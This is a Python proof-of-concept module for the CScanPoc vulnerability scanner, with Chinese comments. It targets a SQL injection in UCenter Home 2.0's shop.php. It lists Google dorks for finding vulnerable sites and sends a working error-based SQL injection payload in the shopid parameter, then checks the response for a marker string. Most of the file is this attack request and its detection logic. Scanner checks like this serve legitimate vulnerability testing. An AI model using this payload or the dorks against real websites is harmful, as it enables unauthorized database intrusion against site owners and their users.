# coding: utf-8
import requests

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0104'  # 平台漏洞编号，留空
    name = 'UCenter Home 2.0 /shop.php SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-24'  # 漏洞公布时间
    desc = '''
    Script HomePage : http://u.discuz.net/
    Dork : Powered by UCenter inurl:shop.php?ac=view
    Dork 2 : inurl:shop.php?ac=view&shopid= .
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/14997/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = '2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a327d278-5214-4619-942f-574131d92656'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            payload = ("/shop.php?ac=view&shopid=253 AND (SELECT 4650 FROM(SELECT COUNT(*),"
                       "CONCAT(0x716b6a6271,(SELECT (CASE WHEN (4650=4650) THEN 1 ELSE 0 END)),"
                       "0x7178787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)")
            verify_url = url + payload
            content = requests.get(verify_url).text
            if 'qkjbq1qxxpq1' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
